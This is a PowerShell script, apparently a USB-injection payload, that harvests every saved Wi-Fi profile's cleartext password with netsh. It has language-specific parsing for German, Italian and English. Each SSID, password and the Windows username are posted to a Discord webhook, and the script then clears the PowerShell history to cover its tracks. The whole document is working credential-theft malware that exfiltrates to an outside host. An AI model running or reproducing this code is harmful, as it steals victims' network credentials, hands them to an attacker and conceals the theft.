# Determine system language
$language = (Get-Culture).TwoLetterISOLanguageName

switch ($language) {
    'de' { # German
        $userProfileString = '(?<=alle Benutzer\s+:\s).+'
        $keyContentString =  '(?<=sselinhalt\s+:\s).+'
    }
    'it' { # Italian
        $userProfileString = '(?<=Tutti i profili utente\s+:\s).+'
        $keyContentString = '(?<=Contenuto chiave\s+:\s).+'
    }
    default { # Default to English if language is not supported
        $userProfileString = '(?<=All User Profile\s+:\s).+'
        $keyContentString = '(?<=Key Content\s+:\s).+'
    }
}

netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String $keyContentString
    
    $stripped_pass = ([string]$passw) | Select-String -Pattern ':.*'
    $stripped_pass = $stripped_pass.Matches.Value
    $stripped_pass = $stripped_pass.Substring(2) 
    $Body = @{
        'username' = $env:username + " | " + [string]$wlan
        'content' = $stripped_pass
    }

    # Remove the comments if you want debug it
    try {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
    } catch {
        Write-Host "Some err: $_"  
    }
}

# Clear the PowerShell command history
Clear-History
